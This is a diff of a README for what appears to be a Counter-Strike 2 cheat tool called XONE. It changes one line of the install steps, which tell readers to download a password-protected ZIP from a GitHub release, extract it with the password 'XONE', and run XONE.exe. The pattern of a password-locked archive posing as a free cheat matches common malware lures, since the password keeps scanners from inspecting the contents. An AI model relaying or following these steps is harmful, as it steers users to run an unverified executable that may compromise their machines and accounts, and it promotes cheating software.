@@ -27,7 +27,7 @@ These features are customizable, allowing you to adjust settings according to yo
 ## Installation:
 
 1. Download the latest version. https://github.com/Wentinon/CS2-Xone-Cheat/releases/download/latest/XONE.zip
-2. Extract the downloaded files, Pass: XONE.
+2. Extract the downloaded files, Pass: XONE
 3. Run XONE.exe.
 
 ## Usage
